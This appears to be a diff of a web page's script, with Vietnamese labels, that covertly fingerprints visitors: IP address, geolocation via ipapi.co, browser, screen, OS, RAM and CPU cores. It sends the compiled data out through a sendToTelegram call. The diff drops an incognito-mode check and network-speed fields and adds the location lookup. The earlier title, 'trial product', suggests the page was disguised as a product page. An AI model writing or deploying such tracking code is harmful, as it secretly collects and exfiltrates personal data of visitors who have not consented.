@@ -3,27 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sản phẩm dùng thử</title>
+    <title>Tracking Page</title>
     <script>
         async function getUserIP() {
             try {
-                let response = await fetch("https://api64.ipify.org?format=json");
-                let data = await response.json();
-                return data.ip;
+                let response = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
+                let text = await response.text();
+                let ip = text.match(/ip=(.*)/)[1];
+                return ip;
             } catch (error) {
                 return "Nothing";
             }
         }
 
-        async function isIncognito() {
+        async function getGeoInfo(ip) {
             try {
-                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                return new Promise(resolve => {
-                    if (!fs) resolve(false);
-                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
-                });
-            } catch (e) {
-                return true;
+                let response = await fetch(`https://ipapi.co/${ip}/json/`);
+                let data = await response.json();
+                return `${data.city}, ${data.region}, ${data.country_name}`;
+            } catch (error) {
+                return "Nothing";
             }
         }
 
@@ -46,6 +45,7 @@
 
         async function collectData() {
             let ip = await getUserIP();
+            let location = await getGeoInfo(ip);
             let browser = navigator.userAgent;
             let language = navigator.language;
             let screenRes = `${screen.width}x${screen.height}`;
@@ -55,14 +55,10 @@
             let platform = navigator.platform;
             let memory = navigator.deviceMemory || "Không xác định";
             let cpuCores = navigator.hardwareConcurrency || "Không xác định";
-            let isPrivate = await isIncognito() ? "Có" : "Không";
-            let connection = navigator.connection || {};
-            let connectionType = connection.effectiveType || "Không xác định";
-            let speed = connection.downlink ? `${connection.downlink} Mbps` : "Không xác định";
-            let latency = connection.rtt ? `${connection.rtt} ms` : "Không xác định";
 
             let data = `
 🌍 *IP*: ${ip}
+📍 *Vị trí*: ${location}
 🖥 *Trình duyệt*: ${browser}
 🌎 *Ngôn ngữ*: ${language}
 🖼 *Màn hình*: ${screenRes}
@@ -72,10 +68,6 @@
 💻 *Hệ điều hành*: ${platform}
 💾 *RAM*: ~${memory} GB
 ⚡ *CPU Cores*: ${cpuCores}
-🔒 *Chế độ ẩn danh*: ${isPrivate}
-📶 *Loại mạng*: ${connectionType}
-🚀 *Tốc độ mạng*: ${speed}
-⏱ *Ping*: ${latency}
             `;
 
             sendToTelegram(data);
